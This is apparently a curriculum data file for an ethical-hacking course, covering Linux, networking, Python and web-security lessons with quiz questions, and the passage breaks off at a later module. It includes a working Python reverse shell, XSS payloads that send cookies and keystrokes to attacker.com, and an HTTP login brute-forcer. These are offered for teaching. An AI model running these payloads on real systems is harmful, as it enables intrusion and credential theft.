import type { Track } from "./types";

export const cybersecurityTrack: Track = {
  id: "cybersecurity",
  title: "Cybersecurity & Ethical Hacking",
  description: "From zero to CEH and beyond. Master ethical hacking, penetration testing, and defensive security from the ground up.",
  longDescription: "A complete cybersecurity curriculum that starts from computer fundamentals and builds to advanced penetration testing, Active Directory attacks, cloud security, and incident response. Every topic is covered from first principles so you understand not just how attacks work, but why.",
  icon: "Shield",
  color: "#ef4444",
  gradient: "track-cybersecurity-gradient",
  level: "beginner",
  estimatedHours: 120,
  tags: ["security", "ethical hacking", "CEH", "penetration testing", "OSCP"],
  modules: [
    // ─── MODULE 1: LINUX & NETWORKING FUNDAMENTALS ───────────────────────────
    {
      id: "fundamentals",
      title: "Computer & Networking Fundamentals",
      level: "beginner",
      description: "Build the unbreakable foundation. You cannot hack what you do not understand — every tool, attack, and defence traces back to these basics.",
      lessons: [
        {
          id: "linux-for-security",
          title: "Linux Basics for Security",
          duration: 75,
          type: "lesson",
          description: "Master the Linux skills every security professional needs daily — filesystem, permissions, processes, scripting, and log analysis.",
          objectives: [
            "Navigate and manipulate the Linux filesystem confidently",
            "Understand user, group, and file permission models",
            "Read and parse system logs to detect anomalies",
            "Write basic Bash scripts to automate security tasks",
            "Use essential text-processing tools: grep, awk, sed, find"
          ],
          content: `# Linux Basics for Security

Linux powers the majority of servers, cloud infrastructure, network devices, and security tools in the world. Kali Linux, Parrot OS, and most penetration testing distributions are Debian-based. If you cannot navigate Linux comfortably, you will constantly be slowed down by the environment instead of focusing on the attack or defence.

## The Filesystem Hierarchy

Linux organises everything under a single root \`/\`. Understanding where things live matters enormously in security work.

\`\`\`
/
├── etc/          # Configuration files — passwords, services, network settings
├── var/          # Variable data — logs live in /var/log
├── home/         # User home directories
├── root/         # Root user home
├── tmp/          # Temporary files — world-writable, common attack staging area
├── usr/          # User programs and libraries
├── bin/ sbin/    # Essential binaries
├── proc/         # Virtual filesystem — kernel and process info
├── dev/          # Device files
└── opt/          # Optional/third-party software
\`\`\`

**Security relevance of key directories:**
- \`/etc/passwd\` — user accounts (world-readable, contains usernames and shells)
- \`/etc/shadow\` — hashed passwords (readable only by root)
- \`/etc/sudoers\` — who can run commands as root — gold for privilege escalation
- \`/var/log/\` — auth.log, syslog, apache2/, nginx/ — forensic treasure
- \`/tmp\` and \`/dev/shm\` — writable by everyone, attackers use these for staging payloads

## File Permissions

Every file has three permission sets: owner, group, others. Each set has read (r=4), write (w=2), execute (x=1).

\`\`\`bash
ls -la /etc/shadow
# -rw-r----- 1 root shadow 1234 May 1 10:00 /etc/shadow
# ^ ^ ^
# | | └── others: no permissions
# | └──── group (shadow): read only
# └────── owner (root): read+write
\`\`\`

The numeric representation:
- \`chmod 755 file\`  → owner rwx, group r-x, others r-x
- \`chmod 600 file\`  → owner rw-, nobody else
- \`chmod 777 file\`  → everyone can do anything — dangerous

**SUID bit (Set User ID)** — when set on an executable, it runs as the file *owner* regardless of who executes it. This is a critical privilege escalation vector.

\`\`\`bash
# Find all SUID binaries on a system
find / -perm -4000 -type f 2>/dev/null

# If you find /usr/bin/nmap with SUID set (owned by root),
# you can use it to escalate privileges
\`\`\`

## Users, Groups, and Switching

\`\`\`bash
whoami          # current user
id              # uid, gid, groups
cat /etc/passwd # all users: username:x:uid:gid:info:home:shell
cat /etc/group  # all groups

su - username   # switch user (needs their password)
sudo command    # run as root (if permitted in /etc/sudoers)
sudo -l         # list what YOU can run as sudo — first thing to check in pentest
\`\`\`

## Processes and Services

\`\`\`bash
ps aux                    # all running processes
ps aux | grep nginx       # find specific process
top / htop                # interactive process monitor
kill PID                  # send SIGTERM (graceful stop)
kill -9 PID               # send SIGKILL (force stop)

# Services (systemd)
systemctl list-units --type=service --state=running
systemctl status ssh
systemctl start/stop/restart nginx
systemctl enable ssh      # start on boot

# Cron jobs — scheduled tasks, often abused for persistence
crontab -l                # list current user's cron jobs
cat /etc/crontab          # system-wide cron jobs
ls /etc/cron.d/           # drop-in cron configs
\`\`\`

## Essential Text Processing Commands

These are your daily tools for log analysis and data extraction:

\`\`\`bash
# grep — search for patterns
grep "Failed password" /var/log/auth.log
grep -r "password" /etc/         # recursive search
grep -v "localhost" access.log   # invert match (exclude)
grep -E "error|warning" app.log  # extended regex

# awk — field-based text processing
awk '{print $1, $4}' access.log          # print columns 1 and 4
awk -F: '{print $1}' /etc/passwd         # colon delimiter, print first field
awk '/Failed/{print $11}' /var/log/auth.log  # IPs of failed SSH logins

# sed — stream editor
sed 's/foo/bar/g' file.txt              # replace all occurrences
sed -n '10,20p' file.txt                # print lines 10-20
sed '/^#/d' config.conf                 # delete comment lines

# find — locate files
find /home -name "*.sh"                 # find shell scripts
find / -perm -4000 2>/dev/null          # SUID files
find /tmp -newer /etc/passwd            # files newer than passwd
find / -user root -writable 2>/dev/null # root-owned writable files

# curl and wget — HTTP requests
curl -I https://example.com             # headers only
curl -X POST -d "user=admin&pass=test" http://target/login
wget -q -O - https://example.com/file  # download silently

# jq — parse JSON
curl -s https://api.example.com/users | jq '.[] | .username'

# netstat / ss — network connections
ss -tulnp          # TCP/UDP listening ports with process names
netstat -antp      # all TCP connections with PIDs
lsof -i :80        # what process is using port 80
\`\`\`

## Reading Logs — The Security Analyst's Primary Source

\`\`\`bash
# Authentication events
tail -f /var/log/auth.log                         # live monitoring
grep "Accepted password" /var/log/auth.log        # successful logins
grep "Failed password" /var/log/auth.log          # failed attempts

# Count failed SSH attempts per IP
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Web server logs
cat /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn
# Spot SQL injection attempts
grep -E "union|select|drop|insert" /var/log/apache2/access.log -i
\`\`\`

## SSH — The Hacker's Favourite Protocol

\`\`\`bash
ssh user@host                          # basic connection
ssh -p 2222 user@host                  # non-standard port
ssh -i ~/.ssh/id_rsa user@host         # key-based auth
ssh -L 8080:internal:80 user@bastion   # local port forward
ssh -R 4444:localhost:4444 user@host   # reverse tunnel (very useful in pentesting)

# Generate SSH keys
ssh-keygen -t ed25519 -C "pentest key"
# Add public key to target: cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
\`\`\`

## Basic Bash Scripting for Security

\`\`\`bash
#!/bin/bash
# Simple port scanner
TARGET=$1
for port in 22 80 443 3306 8080; do
  (echo >/dev/tcp/$TARGET/$port) 2>/dev/null && echo "Port $port is OPEN" || echo "Port $port is closed"
done
\`\`\`

\`\`\`bash
#!/bin/bash
# Count failed login attempts per IP
echo "=== Failed SSH Login Attempts ==="
grep "Failed password" /var/log/auth.log \
  | awk '{print $11}' \
  | sort | uniq -c | sort -rn \
  | head -20
\`\`\``,
          interviewQuestions: [
            { question: "What is the SUID bit and why is it dangerous from a security perspective?", answer: "SUID (Set User ID) causes a program to execute with the permissions of the file's owner rather than the user running it. If a root-owned binary has SUID set, any user can run it with root privileges. Attackers search for SUID binaries that can be abused — e.g., a SUID nmap binary allows running nmap --interactive and dropping into a root shell.", difficulty: "junior" },
            { question: "Where would you look first on a Linux system to find evidence of an attacker's presence?", answer: "/var/log/auth.log for failed/successful logins, /tmp and /dev/shm for staged files, crontab -l and /etc/cron.d/ for persistence, ~/.bash_history for command history, /proc/net/tcp for active connections, and recently modified files via find / -mtime -1.", difficulty: "mid" }
          ],
          quizQuestions: [
            { question: "You find a file with permissions -rwsr-xr-x owned by root. What does the 's' mean and why is it significant?", answer: "The 's' is the SUID bit. The file runs with root privileges regardless of who executes it. This is significant because if the program can be exploited or abused (e.g., has a shell escape), any user can gain root access.", type: "scenario", difficulty: "mid" }
          ]
        },
        {
          id: "networking-fundamentals",
          title: "Networking Fundamentals for Hackers",
          duration: 90,
          type: "lesson",
          description: "OSI model, TCP/IP, subnetting, DNS, key protocols, and the tools to capture and analyse traffic. Every attack travels across a network.",
          objectives: [
            "Explain the OSI model and map attacks to specific layers",
            "Understand TCP/IP, the three-way handshake, and how packets work",
            "Perform subnetting and understand IP addressing",
            "Know the security implications of DNS, DHCP, HTTP, SMB, LDAP, and RDP",
            "Use Wireshark, tcpdump, and nmap for traffic analysis"
          ],
          content: `# Networking Fundamentals for Hackers

Every attack is ultimately a network event. Understanding how data moves from one computer to another — down through layers of abstraction and back up — is the bedrock of all offensive and defensive security work.

## The OSI Model — Why It Matters for Hackers

The OSI (Open Systems Interconnection) model describes how network communication is broken into seven layers. Each layer adds a header to the data as it travels down (encapsulation) and strips it back on arrival (de-encapsulation).

\`\`\`
Layer 7 — Application   HTTP, DNS, SMTP, FTP, SSH      ← Where web attacks live
Layer 6 — Presentation  Encryption, encoding, TLS       ← SSL stripping attacks
Layer 5 — Session       Session management              ← Session hijacking
Layer 4 — Transport     TCP, UDP (ports)                ← Port scanning, DoS
Layer 3 — Network       IP, ICMP, routing               ← Routing attacks, ICMP flood
Layer 2 — Data Link     Ethernet, MAC, ARP, switches    ← ARP spoofing, VLAN hopping
Layer 1 — Physical      Cables, wireless, signals       ← Physical access attacks
\`\`\`

**Mapping attacks to layers:**
- SQL Injection → Layer 7 (Application)
- SSL stripping → Layer 6/5
- Session hijacking → Layer 5
- SYN flood → Layer 4
- IP spoofing → Layer 3
- ARP spoofing, MAC flooding → Layer 2

## TCP/IP — The Real-World Stack

In practice, the internet runs on four layers:

| TCP/IP Layer | OSI Equivalent | Protocols |
|---|---|---|
| Application | 5-7 | HTTP, DNS, SSH, SMTP |
| Transport | 4 | TCP, UDP |
| Internet | 3 | IP, ICMP |
| Link | 1-2 | Ethernet, ARP, Wi-Fi |

### The TCP Three-Way Handshake

Before any TCP data is exchanged, a connection is established:

\`\`\`
Client                    Server
  │                          │
  │──── SYN ────────────────>│  "I want to connect, my seq=1000"
  │<─── SYN-ACK ─────────────│  "OK, my seq=2000, ack=1001"
  │──── ACK ────────────────>│  "Got it, ack=2001"
  │                          │
  │  [Data transfer begins]  │
\`\`\`

**SYN Scan (Stealth Scan):** Nmap sends a SYN, waits for SYN-ACK (port open) or RST (closed), then immediately sends RST without completing the handshake. Faster and less likely to appear in application logs because the connection was never fully established.

## IP Addressing and Subnetting

Every device on a network has an IP address. IPv4 addresses are 32 bits, written as four octets.

\`\`\`
192.168.1.100 / 24

Network:   192.168.1.0    (first 24 bits fixed)
Broadcast: 192.168.1.255  (last address)
Hosts:     192.168.1.1 — 192.168.1.254  (254 usable)
Subnet mask: 255.255.255.0
\`\`\`

**Why subnetting matters in pentesting:**
When you compromise a machine on 10.10.1.50/24, you know the full subnet is 10.10.1.0-255. Run a discovery scan against the /24 to find all hosts — this is called internal network enumeration.

\`\`\`bash
nmap -sn 192.168.1.0/24    # ping sweep — find all live hosts
nmap -sn 10.10.0.0/16      # scan larger network (256 subnets × 256 hosts)
\`\`\`

**Private IP ranges (RFC 1918) — internal networks:**
- 10.0.0.0/8
- 172.16.0.0/12
- 192.168.0.0/16

## Critical Protocols — Attack & Defence Perspective

### DNS (Port 53)
DNS translates domain names to IPs. It is unauthenticated by default.

\`\`\`bash
# Basic lookups
dig example.com A             # A record (IPv4)
dig example.com MX            # mail server
dig example.com NS            # name servers
dig @8.8.8.8 example.com      # query specific DNS server

# Zone transfer (massive OSINT if misconfigured)
dig axfr @ns1.example.com example.com

# Reverse lookup
dig -x 1.2.3.4
\`\`\`

**DNS attacks:** DNS cache poisoning (sending forged responses), DNS tunnelling (exfiltrating data through DNS queries), subdomain enumeration.

### HTTP/HTTPS (Ports 80, 443)
HTTP is stateless. Every request is independent. State is maintained via cookies and sessions.

\`\`\`
GET /login HTTP/1.1
Host: example.com
Cookie: session=abc123
User-Agent: Mozilla/5.0

POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=secret
\`\`\`

**HTTP response codes that matter in pentesting:**
- 200 OK, 301 Redirect, 302 Redirect
- 401 Unauthorized (authentication required)
- 403 Forbidden (authenticated but not allowed — try to bypass)
- 404 Not Found
- 500 Internal Server Error (possible injection, crash)

### SMB (Ports 445, 139)
Server Message Block — Windows file sharing. Historically the most exploited protocol (MS17-010 EternalBlue, WannaCry).

\`\`\`bash
smbclient -L //192.168.1.10 -N          # list shares, no password
smbclient //192.168.1.10/SHARE -N       # connect anonymously
enum4linux -a 192.168.1.10              # full SMB enumeration
\`\`\`

### LDAP (Port 389, 636 for LDAPS)
Active Directory runs on LDAP. Unauthenticated LDAP queries often expose user and group information.

### RDP (Port 3389)
Remote Desktop — common brute force and credential stuffing target. BlueKeep (CVE-2019-0708) was a critical unauthenticated RDP vulnerability.

## Wireshark — Seeing the Network

Wireshark captures raw packets. Run it on your local interface or from a machine with access to network traffic.

**Essential display filters:**
\`\`\`
ip.addr == 192.168.1.100          # traffic to/from specific IP
tcp.port == 80                    # HTTP traffic
http.request.method == "POST"     # POST requests (may contain credentials)
dns                               # all DNS queries
tcp.flags.syn == 1                # SYN packets (new connections)
!(arp or dns or icmp)             # remove noise
http contains "password"          # search HTTP bodies
\`\`\`

## tcpdump — Command-Line Packet Capture

\`\`\`bash
tcpdump -i eth0                          # capture on eth0
tcpdump -i eth0 -w capture.pcap         # save to file
tcpdump -r capture.pcap                 # read from file
tcpdump port 80                          # filter HTTP
tcpdump host 192.168.1.100              # traffic to/from host
tcpdump -i eth0 -nn port 443 -v        # verbose TLS traffic
tcpdump 'tcp[tcpflags] & tcp-syn != 0' # SYN packets only
\`\`\`

## Nmap — The Network Scanner

\`\`\`bash
# Discovery
nmap -sn 192.168.1.0/24              # ping sweep
nmap -Pn 10.10.10.5                  # skip ping, scan anyway

# Port scanning
nmap -sS target                      # SYN scan (stealth, default as root)
nmap -sT target                      # TCP connect scan (no root needed)
nmap -sU -p 53,161,500 target        # UDP scan (slow)
nmap -p- target                      # all 65535 ports
nmap -p 22,80,443,8080 target        # specific ports

# Service and version detection
nmap -sV target                      # version detection
nmap -O target                       # OS fingerprinting
nmap -A target                       # aggressive: OS, version, scripts, traceroute

# Nmap Scripting Engine (NSE)
nmap --script vuln target            # run vulnerability scripts
nmap --script smb-enum-users target  # enumerate SMB users
nmap --script http-title target      # grab HTTP titles
\`\`\`

## Netcat — The Swiss Army Knife

\`\`\`bash
# Port scan
nc -zv 192.168.1.10 22 80 443

# Banner grabbing
nc -nv 192.168.1.10 80
# then type: HEAD / HTTP/1.0 and press Enter twice

# Set up listener (for reverse shells)
nc -lvnp 4444

# Transfer files
# Receiver:  nc -lvnp 4444 > file.txt
# Sender:    nc target 4444 < file.txt
\`\`\``,
          interviewQuestions: [
            { question: "What is a SYN scan and why is it considered 'stealthy'?", answer: "A SYN scan sends a SYN packet and records the response without completing the three-way handshake. If the port is open, the target replies with SYN-ACK, then the scanner sends RST to tear down the half-open connection. It is stealthy because many application-layer logs only record fully established connections (after the ACK), so the scan may not appear in web server or application logs.", difficulty: "junior" },
            { question: "Explain DNS zone transfer and its security implications.", answer: "A zone transfer (AXFR) is a DNS mechanism that allows a secondary DNS server to replicate the full zone data from a primary. If misconfigured to allow transfers from any IP, an attacker can retrieve all DNS records for a domain — revealing internal hostnames, mail servers, internal IPs, and subdomains — providing a complete map of the infrastructure.", difficulty: "mid" }
          ],
          quizQuestions: [
            { question: "A target host replies with RST to a SYN packet. What does this tell you?", answer: "The port is closed. An open port responds with SYN-ACK; a filtered port either drops the packet (no response) or returns an ICMP unreachable; a closed port sends RST-ACK.", type: "scenario", difficulty: "junior" }
          ]
        }
      ],
      exam: [
        { question: "Which directory contains hashed user passwords on Linux?", answer: "/etc/shadow — readable only by root. /etc/passwd contains usernames and shells but passwords are replaced with 'x'.", difficulty: "junior" },
        { question: "What command lists all SUID binaries on a Linux system?", answer: "find / -perm -4000 -type f 2>/dev/null — the -perm -4000 flag matches files where the SUID bit is set.", difficulty: "junior" },
        { question: "At which OSI layer does ARP spoofing operate, and what does it enable?", answer: "Layer 2 (Data Link). ARP spoofing allows an attacker to associate their MAC address with a legitimate IP, causing traffic destined for that IP to be sent to the attacker instead — enabling man-in-the-middle attacks.", difficulty: "mid" }
      ]
    },

    // ─── MODULE 2: PROGRAMMING FOR HACKERS ───────────────────────────────────
    {
      id: "programming-for-hackers",
      title: "Programming & Scripting for Hackers",
      level: "beginner",
      description: "A hacker who cannot automate becomes slow. Learn Python, Bash, and JavaScript with a security focus — build tools, not just use them.",
      lessons: [
        {
          id: "python-for-security",
          title: "Python for Cybersecurity",
          duration: 80,
          type: "lesson",
          description: "Python is the language of security tooling. Build port scanners, brute force simulators, log parsers, and packet sniffers from scratch.",
          objectives: [
            "Write Python scripts for network operations using the socket library",
            "Build a working multi-threaded port scanner",
            "Parse logs and extract IOCs with regex",
            "Make HTTP requests and interact with APIs",
            "Understand reverse shell mechanics at the code level"
          ],
          content: `# Python for Cybersecurity

Python is used in every corner of security: exploit development, malware analysis, automation, tool building, CTF challenges, and red team operations. The standard library alone gives you sockets, HTTP, subprocess execution, file I/O, and crypto.

## Core Concepts Review

\`\`\`python
# Variables and types
ip = "192.168.1.1"
port = 80
ports = [22, 80, 443, 8080]
target_info = {"ip": ip, "port": port, "open": False}

# Control flow
for port in ports:
    if port == 22:
        print(f"SSH port: {port}")
    elif port == 80:
        print(f"HTTP port: {port}")

# Functions
def is_valid_ip(ip):
    parts = ip.split(".")
    if len(parts) != 4:
        return False
    return all(0 <= int(p) <= 255 for p in parts)

# File I/O
with open("targets.txt", "r") as f:
    targets = [line.strip() for line in f.readlines()]

with open("results.txt", "w") as f:
    f.write("192.168.1.1:80 OPEN\\n")
\`\`\`

## Sockets — The Foundation of Network Programming

A socket is a communication endpoint. TCP client sockets connect to a host:port. Understanding sockets demystifies how every network tool works.

\`\`\`python
import socket

# TCP connection test (basic port scan)
def port_open(host, port, timeout=1):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    result = sock.connect_ex((host, port))
    sock.close()
    return result == 0   # 0 = success = port is open

# Banner grabbing — read the service banner
def grab_banner(host, port):
    try:
        sock = socket.socket()
        sock.settimeout(2)
        sock.connect((host, port))
        banner = sock.recv(1024).decode(errors="ignore").strip()
        sock.close()
        return banner
    except:
        return None

print(grab_banner("192.168.1.10", 22))
# b'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3'
\`\`\`

## Multi-threaded Port Scanner

\`\`\`python
import socket
import threading
from queue import Queue

target = "192.168.1.10"
open_ports = []
lock = threading.Lock()
queue = Queue()

def scan_worker():
    while not queue.empty():
        port = queue.get()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((target, port))
        sock.close()
        if result == 0:
            with lock:
                open_ports.append(port)
                print(f"[+] Port {port} OPEN")
        queue.task_done()

# Fill queue with ports 1-1024
for port in range(1, 1025):
    queue.put(port)

# Spawn 100 threads
threads = []
for _ in range(100):
    t = threading.Thread(target=scan_worker)
    t.daemon = True
    t.start()
    threads.append(t)

queue.join()
print(f"\\nOpen ports: {sorted(open_ports)}")
\`\`\`

## HTTP Requests — The Web Hacker's Python

\`\`\`python
import requests

# Basic GET
r = requests.get("https://httpbin.org/get")
print(r.status_code, r.text)

# POST with data (login form simulation)
r = requests.post("http://target/login", data={
    "username": "admin",
    "password": "admin123"
}, allow_redirects=False)

print(r.status_code)
if "Welcome" in r.text:
    print("[+] Login successful!")

# With custom headers and cookies
headers = {"User-Agent": "Mozilla/5.0"}
cookies = {"session": "stolen_token_here"}
r = requests.get("http://target/admin", headers=headers, cookies=cookies)
\`\`\`

## Brute Force Simulator (Educational)

\`\`\`python
import requests

def ssh_bruteforce_sim(target, username, wordlist):
    """Educational simulation — shows the concept"""
    with open(wordlist) as f:
        passwords = f.read().splitlines()

    for password in passwords:
        # In a real scenario this would use paramiko for SSH
        print(f"[*] Trying: {username}:{password}")
        # Check response...

# HTTP login brute force
def http_bruteforce(url, username, wordlist):
    with open(wordlist) as f:
        passwords = f.read().splitlines()

    for password in passwords:
        r = requests.post(url,
            data={"username": username, "password": password},
            allow_redirects=False
        )
        if r.status_code == 302 or "Welcome" in r.text:
            print(f"[+] Found: {username}:{password}")
            return password

    print("[-] Password not found")
    return None
\`\`\`

## Log Parsing with Regex

\`\`\`python
import re
from collections import Counter

# Parse Apache/Nginx access log
# Format: IP - - [date] "METHOD /path HTTP/1.1" status bytes
LOG_PATTERN = r'^(\\S+) \\S+ \\S+ \\[(.+?)\\] "(\\S+) (\\S+) (\\S+)" (\\d+) (\\d+)'

def parse_access_log(log_file):
    failed_logins = []
    sql_attempts = []

    with open(log_file) as f:
        for line in f:
            match = re.match(LOG_PATTERN, line)
            if not match:
                continue

            ip, date, method, path, protocol, status, size = match.groups()

            # Detect SQL injection attempts
            if re.search(r"union|select|drop|insert|--|\\'", path, re.I):
                sql_attempts.append({"ip": ip, "path": path})

            # 401 = auth failure
            if status == "401":
                failed_logins.append(ip)

    print("=== Top Attackers (Failed Logins) ===")
    for ip, count in Counter(failed_logins).most_common(10):
        print(f"  {ip}: {count} attempts")

    print(f"\\n=== SQL Injection Attempts: {len(sql_attempts)} ===")
    for attempt in sql_attempts[:5]:
        print(f"  {attempt['ip']}: {attempt['path']}")
\`\`\`

## Simple Packet Sniffer with Scapy

\`\`\`python
from scapy.all import sniff, IP, TCP, Raw

def packet_callback(packet):
    if packet.haslayer(IP):
        src = packet[IP].src
        dst = packet[IP].dst

        if packet.haslayer(TCP):
            sport = packet[TCP].sport
            dport = packet[TCP].dport

            # Look for plain text credentials in HTTP traffic
            if packet.haslayer(Raw):
                payload = packet[Raw].load.decode(errors="ignore")
                if "password" in payload.lower() or "passwd" in payload.lower():
                    print(f"[!] Possible credentials: {src}:{sport} -> {dst}:{dport}")
                    print(f"    Payload: {payload[:200]}")

print("[*] Starting packet capture (Ctrl+C to stop)...")
sniff(iface="eth0", filter="tcp port 80", prn=packet_callback, store=0)
\`\`\`

## Reverse Shell Mechanics (Conceptual)

Understanding what a reverse shell does at the code level removes the mystery:

\`\`\`python
# This is how reverse shells work conceptually (educational)
# A reverse shell connects BACK to the attacker from the victim
import socket, subprocess

# On victim machine — connects out to attacker
def reverse_shell(attacker_ip, port):
    s = socket.socket()
    s.connect((attacker_ip, port))

    while True:
        # Receive command from attacker
        cmd = s.recv(1024).decode()
        if cmd.lower() == "exit":
            break
        # Execute and send back output
        output = subprocess.getoutput(cmd)
        s.send(output.encode())

    s.close()

# Why reverse shells bypass firewalls:
# Inbound connections are blocked by firewall rules
# Outbound connections are typically allowed
# A reverse shell initiates an outbound connection — it is not blocked
\`\`\``,
          interviewQuestions: [
            { question: "Why do attackers use reverse shells instead of bind shells in most scenarios?", answer: "Bind shells listen on a port on the victim machine, requiring the attacker to connect inbound — this is blocked by most firewalls. Reverse shells initiate an outbound connection from the victim to the attacker, which firewalls almost always allow since outbound traffic is typically trusted.", difficulty: "mid" }
          ],
          quizQuestions: [
            { question: "Write a Python one-liner to test if port 80 is open on 10.10.10.5.", answer: "import socket; print(socket.connect_ex(('10.10.10.5', 80)) == 0)", type: "hands-on", difficulty: "junior" }
          ]
        },
        {
          id: "web-tech-for-hackers",
          title: "Web Technology for Hackers",
          duration: 60,
          type: "lesson",
          description: "Before exploiting web applications, understand how they work: HTTP, cookies, sessions, JWTs, CORS, and browser mechanics.",
          objectives: [
            "Understand the full HTTP request/response cycle",
            "Explain how cookies, sessions, and JWTs work and their vulnerabilities",
            "Understand CORS and why misconfigured CORS is dangerous",
            "Use browser developer tools to inspect and modify requests",
            "Understand how JavaScript executes in the browser context"
          ],
          content: `# Web Technology for Hackers

Web applications are the most common attack surface in modern penetration testing. Before you can exploit them, you must understand exactly how they work — from the moment a user types a URL to the moment the page renders.

## The Full HTTP Cycle

\`\`\`
1. User types: https://example.com/login
2. Browser resolves DNS: example.com → 93.184.216.34
3. Browser opens TCP connection to 93.184.216.34:443
4. TLS handshake — certificate exchange, key negotiation
5. Browser sends HTTP request:

GET /login HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/xhtml+xml
Cookie: session=eyJhbGciOiJIUzI1NiJ9...
Connection: keep-alive

6. Server processes, returns:

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Set-Cookie: csrf_token=abc123; HttpOnly; Secure
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'

<html>...</html>
\`\`\`

## Cookies — How Web State is Maintained

HTTP is stateless. After a successful login, the server needs a way to identify the user on subsequent requests. It does this with cookies.

\`\`\`
Set-Cookie: session=eyJ1c2VyaWQiOiAxMjN9;
            Path=/;
            HttpOnly;       ← JavaScript cannot read this cookie
            Secure;         ← Only sent over HTTPS
            SameSite=Strict ← Not sent with cross-site requests
\`\`\`

**Security flags and their absence:**
- Missing \`HttpOnly\` → XSS can steal the cookie with \`document.cookie\`
- Missing \`Secure\` → cookie sent over HTTP, interceptable
- Missing \`SameSite\` → cookie sent with cross-site requests (CSRF vulnerability)

**Testing cookies in Burp Suite:**
1. Log in to capture the \`Set-Cookie\` header
2. Try modifying the session value — weak session tokens can be guessed
3. Try decoding — Base64-encoded cookies sometimes contain plaintext data

## Sessions vs JWTs

**Server-side sessions:**
\`\`\`
User logs in → Server creates session: {sessionId: "abc123", userId: 456}
Server stores this in memory/database
Server sends: Set-Cookie: session=abc123
On next request: server looks up abc123, finds userId=456
\`\`\`

**JWTs (JSON Web Tokens):**
\`\`\`
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9    ← Header (base64)
.eyJ1c2VySWQiOjEyM30                      ← Payload (base64)
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature (HMAC-SHA256)
\`\`\`

Decode the payload: \`{"userId": 123, "role": "user", "exp": 1735689600}\`

**JWT vulnerabilities:**
1. **Algorithm confusion** — change \`"alg": "HS256"\` to \`"alg": "none"\` — some libraries skip signature verification
2. **Weak secret** — \`jwt-cracker\` or hashcat can brute-force short secrets
3. **Sensitive data in payload** — base64 is encoding, not encryption — anyone can read it

\`\`\`bash
# Decode JWT without verifying (inspect the payload)
echo "eyJ1c2VySWQiOjEyM30" | base64 -d
# {"userId":123}

# Crack JWT secret
hashcat -a 0 -m 16500 token.txt wordlist.txt
\`\`\`

## CORS — Cross-Origin Resource Sharing

The Same-Origin Policy prevents \`evil.com\` from making authenticated requests to \`bank.com\` using the victim's cookies. CORS is the mechanism that selectively relaxes this.

A CORS misconfiguration:
\`\`\`
Request:
Origin: https://evil.com

Vulnerable response:
Access-Control-Allow-Origin: https://evil.com    ← Reflects attacker origin!
Access-Control-Allow-Credentials: true           ← Allows cookies!
\`\`\`

**Exploitation:** An attacker's page can now make authenticated API requests to the target on behalf of the victim and read the response — including account details, API keys, and private data.

## Browser Developer Tools — Your Free Burp Lite

In any browser, \`F12\` opens DevTools:

- **Network tab** — see every HTTP request, headers, bodies, timing
- **Application tab** — cookies, localStorage, sessionStorage, IndexedDB
- **Console** — run JavaScript: \`document.cookie\`, \`localStorage.getItem("token")\`
- **Sources** — read JavaScript source code, set breakpoints

\`\`\`javascript
// In browser console — extract data
document.cookie                          // all non-HttpOnly cookies
localStorage                             // local storage items
JSON.parse(atob(token.split(".")[1]))    // decode JWT payload
\`\`\`

## JavaScript in Security Context

JavaScript executes in the browser with access to the DOM, cookies (if not HttpOnly), localStorage, and can make HTTP requests. This is why XSS is so dangerous.

\`\`\`javascript
// XSS payload — what an attacker injects
<script>
  // Steal cookie and send to attacker's server
  new Image().src = "https://attacker.com/steal?c=" + document.cookie;
</script>

// More subtle — keylogger injected via XSS
<script>
  document.addEventListener("keypress", function(e) {
    fetch("https://attacker.com/log?k=" + e.key);
  });
</script>
\`\`\``,
          interviewQuestions: [
            { question: "What is the difference between HttpOnly and Secure cookie flags?", answer: "HttpOnly prevents JavaScript from accessing the cookie via document.cookie, protecting against XSS-based cookie theft. Secure ensures the cookie is only transmitted over HTTPS connections, preventing interception on unencrypted HTTP.", difficulty: "junior" },
            { question: "Explain the 'alg:none' JWT attack.", answer: "Some JWT libraries accept 'none' as the algorithm, meaning no signature is required. An attacker decodes the JWT, modifies the payload (e.g., changes role from 'user' to 'admin'), sets the algorithm to 'none', removes the signature, and re-encodes. If the server accepts it, the attacker has escalated privileges.", difficulty: "mid" }
          ],
          quizQuestions: [
            { question: "A cookie is set without the HttpOnly flag. What attack does this enable?", answer: "XSS (Cross-Site Scripting). An attacker who can inject JavaScript into the page can steal the session cookie using document.cookie and send it to their server, then use that cookie to impersonate the victim.", type: "scenario", difficulty: "junior" }
          ]
        }
      ],
      exam: [
        { question: "What Python library is used for crafting and sniffing network packets?", answer: "Scapy — it allows construction of packets at any layer, packet capture, and traffic analysis from Python scripts.", difficulty: "junior" },
        { question: "Why is a JWT payload not secret even though it looks encoded?", answer: "The payload is Base64URL-encoded, not encrypted. Anyone can decode it without a key using atob() or base64 -d. Only the signature is cryptographically protected — the payload is merely transported, not hidden.", difficulty: "mid" }
      ]
    },

    // ─── MODULE 3: SECURITY FOUNDATIONS ──────────────────────────────────────
    {
      id: "security-foundations",
      title: "Cybersecurity Foundations & Cryptography",
      level: "beginner",
      description: "The theoretical backbone: CIA Triad, threat modelling, authentication, encryption, hashing, PKI, and TLS — understanding these makes every attack and defence make sense.",
      lessons: [
        {
          id: "core-security-concepts",
          title: "Core Security Concepts & Threat Modelling",
          duration: 60,
          type: "lesson",
          description: "CIA Triad, authentication vs authorisation, risk assessment, threat modelling, and the ethical/legal framework for security work.",
          objectives: [
            "Apply the CIA Triad to classify security incidents and attacks",
            "Distinguish authentication from authorisation and describe common mechanisms",
            "Perform basic threat modelling using STRIDE",
            "Understand the legal framework governing ethical hacking",
            "Explain risk = likelihood × impact and how it drives prioritisation"
          ],
          content: `# Core Security Concepts & Threat Modelling

